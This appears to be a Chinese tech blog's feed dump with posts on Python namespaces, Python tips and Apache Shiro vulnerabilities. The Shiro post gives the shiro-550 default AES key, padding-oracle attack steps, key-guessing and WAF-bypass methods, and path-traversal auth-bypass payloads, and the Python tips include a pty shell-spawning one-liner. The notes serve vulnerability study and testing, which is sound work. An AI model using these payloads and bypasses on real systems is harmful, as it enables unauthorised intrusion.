img\Untitled-2022-08-08-1428.png" alt="Untitled-2022-08-08-1428" style="zoom:80%;" /><p>所以我们的程序处在orginal里，所以想用socket模块中的方法就必须用.来访问</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="comment">#创建TCP/IP套接字</span></span><br><span class="line">tcpSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment">#创建UDP/IP套接字</span></span><br><span class="line">udpSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br></pre></td></tr></table></figure><p>但是我们像下面这样写，就相当于把socket模块导入到我们的命名空间original中，就可以直接调用方法了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#创建TCP/IP套接字</span></span><br><span class="line">tcpSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line"><span class="comment">#创建UDP/IP套接字</span></span><br><span class="line">udpSock = socket(AF_INET, SOCK_DGRAM)</span><br></pre></td></tr></table></figure><p>什么都没有的py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    a=<span class="number">10</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">locals</span>())<span class="comment">#查看test函数所在的local空间</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">globals</span>())<span class="comment">#查看global空间</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">test()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(__builtins__))<span class="comment">#查看built-in空间（就是python的内置函数和模块）</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220808144812676-1687707604251.png" alt="image-20220808144812676"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#global</span></span><br><span class="line">&#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;__package__&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="built_in">object</span> at <span class="number">0x0000023A5A4A0850</span>&gt;,  <span class="string">&#x27;__spec__&#x27;</span>: <span class="literal">None</span>, </span><br><span class="line"> <span class="string">&#x27;__annotations__&#x27;</span>: &#123;&#125;, </span><br><span class="line"> <span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;,  </span><br><span class="line"> <span class="string">&#x27;__file__&#x27;</span>: <span class="string">&#x27;d:\\python3.8\\code\\1.py&#x27;</span>, </span><br><span class="line"> <span class="string">&#x27;__cached__&#x27;</span>: <span class="literal">None</span>, </span><br><span class="line"> <span class="string">&#x27;test&#x27;</span>: &lt;function test at <span class="number">0x0000023A5A5E9F70</span>&gt;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220808140251398-1687707604252.png" alt="image-20220808140251398"></p><p>因为在my_func中先使用了变量a<code>print(f&quot;iprefix&#125; &#123;a&#125;&quot;)</code>,然后才在my_func中声明了变量a,所以报错。</p><p><img src="/../images/image-20220808140402575-1687707604252.png" alt="image-20220808140402575"></p><p>在my_func中声明了<code>global a</code>,所以python知道local空间中的a指向global空间中的a。</p><p>所以在local中改变a的值，会影响global中的a。</p><p><img src="/../images/image-20220808140452593-1687707604252.png" alt="image-20220808140452593"></p><p>原本在global空间中没有变量a,但是在local中声明了<code>global a</code>，python会自动在global中分配空间给变量a。</p><blockquote><p>作者说it’s bad code😄</p></blockquote><p><img src="/../images/image-20220808140611573-1687707604252.png" alt="image-20220808140611573"></p><p><code>globals()</code>返回的是字典形式，可以通过键值索引的方式访问。</p><p><img src="/../images/image-20220808140711338-1687707604252.png" alt="image-20220808140711338"></p><p>如何展示函数的local空间中保存的变量</p><ol><li><p>函数的body中<code>print(locals())</code></p></li><li><p>通过函数的code方法下的属性访问</p><p><img src="/../images/image-20220808151843058-1687707604252.png" alt="image-20220808151843058"></p></li></ol><p><img src="/../images/image-20220808153058120-1687707604253.png" alt="image-20220808153058120"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">10</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">x=<span class="number">20</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test2</span>():</span><br><span class="line"><span class="keyword">global</span> x</span><br><span class="line">x=<span class="number">10</span></span><br><span class="line">test2()</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line">test()</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220808141136207-1687707604253.png" alt="image-20220808141136207"></p><p><img src="/../images/image-20220808141228174-1687707604253.png" alt="image-20220808141228174"></p><p>nonlocal用于寻找同为local空间的变量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nonlocal means, not in the current function&#x27;s local scope and neither in the global scope</span><br><span class="line">nonlocal的寻找范围：上一级local空间到global空间的下一级</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220808141525359-1687707604253.png" alt="image-20220808141525359"></p><p><img src="/../images/image-20220808141538079-1687707604253.png" alt="image-20220808141538079"></p><p>虽然global中声明了变量a，但是nonlocal还是找不到变量a</p><p><img src="/../images/image-20220808141845300-1687707604253.png" alt="image-20220808141845300"></p><p><img src="/../images/image-20220808141538079-1687707604253.png" alt="image-20220808141538079"></p><p>即使在local中声明了<code>global a</code>,nonlocal仍然找不到变量a</p><p>所以nonlocal的寻找范围：上一级local空间到global空间的下一级</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python技巧</title>
      <link href="/2023/05/01/python%E6%8A%80%E5%B7%A7/"/>
      <url>/2023/05/01/python%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h3 id="输出列表元素"><a href="#输出列表元素" class="headerlink" title="输出列表元素"></a>输出列表元素</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lis=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(lis[<span class="number">1</span>:])</span><br><span class="line"><span class="built_in">print</span>(*lis[<span class="number">1</span>:])</span><br><span class="line">&gt;&gt;</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="number">2</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="同时获得元素与元素索引"><a href="#同时获得元素与元素索引" class="headerlink" title="同时获得元素与元素索引"></a>同时获得元素与元素索引</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lis = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index,i <span class="keyword">in</span> <span class="built_in">enumerate</span>(lis):</span><br><span class="line"><span class="built_in">print</span>(index,i)</span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="number">0</span> a</span><br><span class="line"><span class="number">1</span> b</span><br><span class="line"><span class="number">2</span> c</span><br></pre></td></tr></table></figure><h3 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a>字符串格式化</h3><ul><li><p>类似c语言</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># %s 字符串占位</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s&quot;</span>%<span class="string">&#x27;abcd&#x27;</span>)</span><br><span class="line"><span class="comment"># %c 字符占位</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%c&quot;</span>%<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p>format   (会自动将变量转为str)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line">a=<span class="number">1</span></span><br><span class="line">b=<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;a&#125;</span><span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure><blockquote><p>占位符格式化<a href="https://blog.csdn.net/u014770372/article/details/76021988">https://blog.csdn.net/u014770372/article/details/76021988</a></p></blockquote></li></ul><h3 id="交换数值"><a href="#交换数值" class="headerlink" title="交换数值"></a>交换数值</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">1</span></span><br><span class="line">b=<span class="number">2</span></span><br><span class="line">a,b=b,a</span><br><span class="line"><span class="built_in">print</span>(a,b)</span><br><span class="line">&gt;&gt;<span class="number">2</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="推导式"><a href="#推导式" class="headerlink" title="推导式"></a>推导式</h3><blockquote><p>[想得到的变量形式 for 变量 in 可迭代对象 if 条件表达式]</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#找出列表里大于0的数</span></span><br><span class="line">shu=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,-<span class="number">1</span>,-<span class="number">2</span>,-<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> shu <span class="keyword">if</span> i&gt;<span class="number">0</span>])</span><br><span class="line">&gt;&gt;[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#统计一个字符串中每个字符出现的次数</span></span><br><span class="line">m = <span class="string">&#x27;I am Khazking!&#x27;</span></span><br><span class="line">n = &#123;i:m.count(i) <span class="keyword">for</span> i <span class="keyword">in</span> m&#125;</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line">&gt;&gt;&#123;<span class="string">&#x27;I&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27; &#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;m&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;K&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;h&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;z&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;k&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;i&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;n&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;g&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;!&#x27;</span>: <span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串替换"><a href="#字符串替换" class="headerlink" title="字符串替换"></a>字符串替换</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#repalce方法只能实现元素一对一替换</span></span><br><span class="line"><span class="comment">#使用下述方法可以实现b替换为z,z替换为b</span></span><br><span class="line"><span class="comment">#建立映射关系字典</span></span><br><span class="line">a=<span class="string">&#x27;zbbz&#x27;</span></span><br><span class="line">table = <span class="string">&#x27;&#x27;</span>.maketrans(<span class="string">&#x27;bz&#x27;</span>,<span class="string">&#x27;zb&#x27;</span>)<span class="comment">#等价于 table= &#123;&#x27;b&#x27;:&#x27;z&#x27;,&#x27;z&#x27;:&#x27;b&#x27;&#125;</span></span><br><span class="line">a = a.translate(table)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">&gt;&gt;bzzb</span><br></pre></td></tr></table></figure><h3 id="各种排序"><a href="#各种排序" class="headerlink" title="各种排序"></a>各种排序</h3><p><code>reverse=True</code>降序，默认为升序</p><ul><li><p>字典排序</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 按键值排序</span></span><br><span class="line"><span class="built_in">sorted</span>(dic.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># 按键名排序</span></span><br><span class="line"><span class="built_in">sorted</span>(dic.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">0</span>],reverse=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></li><li><p>嵌套排序</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字典嵌套</span></span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>: [<span class="number">1</span>, <span class="number">3</span>], <span class="string">&#x27;c&#x27;</span>: [<span class="number">3</span>, <span class="number">4</span>], <span class="string">&#x27;b&#x27;</span>: [<span class="number">0</span>, <span class="number">2</span>], <span class="string">&#x27;d&#x27;</span>: [<span class="number">2</span>, <span class="number">1</span>]&#125;</span><br><span class="line"><span class="built_in">sorted</span>(dic.items(), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>][<span class="number">1</span>], reverse=<span class="literal">True</span>) <span class="comment"># 按键值（列表）的第二个元素排列</span></span><br><span class="line"><span class="comment"># 列表嵌套</span></span><br><span class="line">[[<span class="string">&#x27;金牛&#x27;</span>, <span class="number">89000</span>, <span class="number">13140.196950444726</span>, <span class="number">2800</span>, <span class="number">1574</span>], [<span class="string">&#x27;锦江&#x27;</span>, <span class="number">113800</span>, <span class="number">18719.342387419587</span>, <span class="number">2550</span>, <span class="number">1399</span>], [<span class="string">&#x27;成华&#x27;</span>, <span class="number">96400</span>, <span class="number">14034.861538461539</span>, <span class="number">2300</span>, <span class="number">1300</span>], [<span class="string">&#x27;高新&#x27;</span>, <span class="number">160000</span>, </span><br><span class="line"><span class="number">23663.31254871395</span>, <span class="number">3600</span>, <span class="number">1283</span>], [<span class="string">&#x27;武侯&#x27;</span>, <span class="number">102000</span>, <span class="number">19768.739789964995</span>, <span class="number">3100</span>, <span class="number">857</span>]]</span><br><span class="line"><span class="built_in">sorted</span>(lis, key = <span class="keyword">lambda</span> k : k[<span class="number">2</span>],reverse= <span class="literal">True</span>) <span class="comment"># 按每个子列表的第三个元素排列</span></span><br></pre></td></tr></table></figure></li></ul><p>修改下标即可按照其他元素进行排列。</p><h3 id="统计字符出现的频率"><a href="#统计字符出现的频率" class="headerlink" title="统计字符出现的频率"></a>统计字符出现的频率</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">data = [randint(<span class="number">0</span>,<span class="number">20</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>)]</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">dict</span>.fromkeys(data,<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    s[i]+=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 统计字符出现次数</span></span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#统计s中出现频率最高的三个数</span></span><br><span class="line"><span class="built_in">print</span> (Counter(s).most_common(<span class="number">3</span>))</span><br></pre></td></tr></table></figure><h3 id="从序列中筛选出符合条件的元素"><a href="#从序列中筛选出符合条件的元素" class="headerlink" title="从序列中筛选出符合条件的元素"></a>从序列中筛选出符合条件的元素</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"><span class="comment">#filter(function, iterable)</span></span><br><span class="line">data = [randint(-<span class="number">10</span>,<span class="number">10</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">data = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x:x&gt;=<span class="number">0</span>,data))</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#或者列表推导式</span></span><br></pre></td></tr></table></figure><h3 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h3><blockquote><p>我们采集数据进行分析，但是我们只需要保存结果，我们采集的数据如果常驻内存就会让电脑崩溃，于是我们将这个数据放在临时文件中（外部存储），在文件关闭后将被删除</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tempfile <span class="keyword">import</span> TemporaryFile,NamedTemporaryFile</span><br><span class="line">f = TemporaryFile()</span><br><span class="line">f.write(<span class="string">b&#x27;abc&#x27;</span>*<span class="number">10000</span>)</span><br><span class="line">f.seek(<span class="number">0</span>)</span><br><span class="line">a=f.read(<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><blockquote><p>这个临时文件在系统中是找不到的，如果我们想创建一个能在文件系统中看到的临时文件，我们就用NamedTemporaryFile</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nte = NamedTemporaryFile(delete=false)<span class="comment">#delete参数为false时程序运行完，临时文件也不会被删除</span></span><br><span class="line"><span class="built_in">print</span>(nte.name)</span><br></pre></td></tr></table></figure><h3 id="穷举组合"><a href="#穷举组合" class="headerlink" title="穷举组合"></a>穷举组合</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#全排列  </span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"><span class="comment">#permutations()返回的是tuple类型，所要要用&#x27;&#x27;.join(i)连接起来</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> permutations(<span class="string">&#x27;123&#x27;</span>,<span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(i),end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="模拟终端"><a href="#模拟终端" class="headerlink" title="模拟终端"></a>模拟终端</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pty;pty.spawn(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="二进制文件原地修改"><a href="#二进制文件原地修改" class="headerlink" title="二进制文件原地修改"></a>二进制文件原地修改</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> mmap</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">memory_map</span>(<span class="params">filename, access=mmap.ACCESS_WRITE</span>):</span><br><span class="line">    size = os.path.getsize(filename)</span><br><span class="line">    fd = os.<span class="built_in">open</span>(filename, os.O_RDWR)</span><br><span class="line">    <span class="keyword">return</span> mmap.mmap(fd, size, access=access)</span><br><span class="line">m = memory_map(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(m)</span><br><span class="line"><span class="number">1000000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line"><span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="脚本参数"><a href="#脚本参数" class="headerlink" title="脚本参数"></a>脚本参数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python xx.py aa</span><br><span class="line"></span><br><span class="line">sys.argv[<span class="number">0</span>]→xx.py</span><br><span class="line">sys.argv[<span class="number">1</span>]→aa</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&quot;-u&quot;</span>,<span class="string">&quot;--url&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;target url&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-t&quot;</span>, <span class="string">&quot;--threads&quot;</span> , <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&quot;threads num&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">&gt;&gt;</span><br><span class="line">python xx.py -u xx.com -t <span class="number">20</span></span><br><span class="line"></span><br><span class="line">args.url=xx.com</span><br><span class="line">args.threads=<span class="number">20</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>shiro漏洞</title>
      <link href="/2023/05/01/shiro%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/05/01/shiro%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="Shiro概述"><a href="#Shiro概述" class="headerlink" title="Shiro概述"></a>Shiro概述</h2><p>​Apache Shiro是一个开源<strong>安全框架</strong>，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><p>​通常与tomcat一起使用，也可以替换spring security集成到spring中（如若依）。</p><h2 id="框架特征"><a href="#框架特征" class="headerlink" title="框架特征"></a>框架特征</h2><p>在请求包的Cookie中有rememberMe字段赋任意值，收到返回包的 Set-Cookie 中存在?rememberMe&#x3D;deleteMe?字段，说明目标有使用Shiro框架</p><p><img src="/../images/image-20230623161016099.png" alt="image-20230623161016099"></p><h2 id="shiro漏洞"><a href="#shiro漏洞" class="headerlink" title="shiro漏洞"></a>shiro漏洞</h2><p><img src="/../images/49e8911f-6936-4429-8213-5d369fafd193.png-w331s" alt="img"></p><h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>​Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。</p><p>在服务端对rememberMe的cookie值的处理</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RememberMe Cookie值 =&gt; base64解码 =&gt; AES解密 =&gt; 反序列化</span><br></pre></td></tr></table></figure><p>如果知道<code>AES</code>的密钥就可以构造恶意<code>cookie</code>，从而造成反序列化RCE漏洞。所以这也是shiro反序列化经久不衰的原因。</p><p>payload生成</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">恶意类 =&gt; 序列化 =&gt; AES加密 =&gt; base64编码</span><br></pre></td></tr></table></figure><h4 id="shiro-550"><a href="#shiro-550" class="headerlink" title="shiro-550"></a>shiro-550</h4><p>​Apache Shiro 1.2.5之前的版本在<code>org.apache.shiro.mgt.AbstractRememberMeManager</code>中存在AES默认秘钥<code>kPH+bIxk5D2deZiIxcaaaA==</code>。</p><p>​在之后的版本，密钥为随机生成的。</p><h4 id="shiro-721"><a href="#shiro-721" class="headerlink" title="shiro-721"></a>shiro-721</h4><ul><li>概述</li></ul><p>​Apache Shiro 1.4.2之前的版本默认使用AES&#x2F;CBC&#x2F;PKCS5Padding模式加密，该加密模式存在缺陷，当攻击者<strong>获得一个有效的rememberMe Cookie值时</strong>，可以通过Padding Oracle Attack构造有效的恶意序列化数据来发起攻击。</p><ul><li><p>复现</p><blockquote><p>参考<a href="https://github.com/inspiringz/Shiro-721">inspiringz&#x2F;Shiro-721: Shiro-721 RCE Via RememberMe Padding Oracle Attack (github.com)</a></p><p>注意点：因为爆破的时间太长（几个小时），不适用于实际环境的测试。会把环境打崩或者ip被ban</p></blockquote><ul><li>正常登录网站（勾选Remember），并从Cookie中获取合法的RememberMe。</li><li>使用RememberMe cookie作为Padding Oracle Attack的前缀。</li><li>加密 ysoserial 的序列化 payload，以通过Padding Oracle Attack制作恶意RememberMe。</li><li>重放恶意RememberMe cookie，以执行反序列化攻击。</li></ul></li><li><p>修复</p><p>在之后的版本加密模式 AES-CBC被更换为 AES-GCM，所以在使用工具等时需要注意该加密模式的变化。</p></li></ul><h4 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h4><h5 id="密钥获取"><a href="#密钥获取" class="headerlink" title="密钥获取"></a>密钥获取</h5><ul><li><p>github收集</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">securityManager.rememberMeManager.cipherKey</span><br><span class="line">cookieRememberMeManager.setCipherKey</span><br><span class="line">setCipherKey(Base64.decode</span><br></pre></td></tr></table></figure></li><li><p>任意文件读取&#x2F;下载</p></li><li><p>heapdump</p></li><li><p>爆破</p><p>使用一个空的 <code>SimplePrincipalCollection</code>作为 payload，序列化后使用待检测的秘钥进行加密并发送。</p><p>当密钥正确时<strong>不返回</strong>deleteMe </p><p><img src="/../images/image-20230909224050081.png" alt="image-20230909224050081"></p><p>密钥错误时<strong>返回</strong> deleteMe</p><p><img src="/../images/image-20230909224225905.png" alt="image-20230909224225905"></p><p>还有一种情况，如果秘钥正确返回的是一个 <code>deleteMe</code>，密钥错误返回的是两个 <code>deleteMe</code>。</p></li></ul><h5 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h5><ul><li><p>Tomcat 9.0.19</p><p>插入\x0d</p><p><img src="/../images/7.png" alt="img"></p></li><li><p>插入Base64垃圾数据绕过（FUZZ）</p></li></ul><p><img src="/../images/image-20230909230652318.png" alt="image-20230909230652318"></p><p><img src="/../images/image-20230909230621472.png" alt="image-20230909230621472"></p><p><img src="/../images/image-20230909230736285.png" alt="image-20230909230736285"></p><ul><li><p>未知http请求</p><p>未知http请求时，shiro是先处理cookie后在到servlet，所以rememberMe值是会处理的</p></li></ul><h5 id="请求头大小被限制"><a href="#请求头大小被限制" class="headerlink" title="请求头大小被限制"></a>请求头大小被限制</h5><blockquote><p>tomcat默认header最大长度设置为8192</p><p>人为对Cookie长度进行限制</p></blockquote><p>解决方法：</p><p><img src="/../images/image-20230910143028324.png" alt="image-20230910143028324"></p><ul><li><a href="https://blog.csdn.net/Thunderclap_/article/details/128932553">shiro的payload长度限制绕过-CSDN博客</a></li><li><a href="https://y4tacker.github.io/2022/04/14/year/2022/4/%E6%B5%85%E8%B0%88Shiro550%E5%8F%97Tomcat-Header%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E5%BD%B1%E5%93%8D%E7%AA%81%E7%A0%B4/">浅谈Shiro550受Tomcat Header长度限制影响突破 | Y4tacker’s Blog</a></li></ul><h5 id="反序列化链"><a href="#反序列化链" class="headerlink" title="反序列化链"></a>反序列化链</h5><p>由于Shiro重写了resolveClass方法，将原生方法中的forName方法替换为loadClass方法，由于loadClass无法加载数组类型的类，因此存在Transformer[]类的CommonCollections gadget无法成功利用此漏洞，（例如ysoserial CommonCollections1、CommonCollections3）</p><p>思路：</p><p><img src="/../images/1645693858000-8awcri.png-w331s" alt="image-20220221183250833"></p><p><strong>shiro默认是没有cc依赖的，但是存在commons-beanutils 1.8.3依赖</strong></p><p>工具：Redisexp</p><h3 id="身份验证绕过漏洞"><a href="#身份验证绕过漏洞" class="headerlink" title="身份验证绕过漏洞"></a>身份验证绕过漏洞</h3><table><thead><tr><th align="center">编号</th><th align="center">版本影响</th><th align="center">payload</th></tr></thead><tbody><tr><td align="center">CVE-2023-22602</td><td align="center">Apache Shiro &lt; 1.11.0，Spring Boot&gt;&#x3D;2.6</td><td align="center">&#x2F;admin&#x2F;..</td></tr><tr><td align="center">CVE-2022-32532</td><td align="center">Shiro &lt; 1.9.1</td><td align="center">&#x2F;admin&#x2F;%0d，&#x2F;admin&#x2F;%0a</td></tr><tr><td align="center">CVE-2022-40664</td><td align="center">Shiro &lt; 1.10.0</td><td align="center">在进行请求转发或包含时不会进行鉴权，导致绕过</td></tr><tr><td align="center">CVE-2020-1957</td><td align="center">Shiro &lt;1.5.2</td><td align="center">&#x2F;xxx&#x2F;..;&#x2F;admin&#x2F;</td></tr></tbody></table><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://paper.seebug.org/1378/">Shiro 组件漏洞与攻击链分析</a></p><p><a href="https://paper.seebug.org/1285/">Shiro RememberMe 漏洞检测的探索之路</a></p><p><a href="http://changxia3.com/2022/05/09/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%BA%94%EF%BC%88%E5%AF%B9%E6%8A%97%E7%AF%87%EF%BC%89/#rememberMe%E5%80%BC%E7%BB%95%E8%BF%87">Shiro反序列化漏洞笔记五（对抗篇） (changxia3.com)</a></p><p><a href="https://gv7.me/articles/2021/shiro-deserialization-bypasses-waf-through-unknown-http-method/">shiro反序列化绕WAF之未知HTTP请求方法 | 回忆飘如雪 (gv7.me)</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网</title>
      <link href="/2023/05/01/%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/05/01/%E5%9F%BA%E7%A1%80/</url>
      
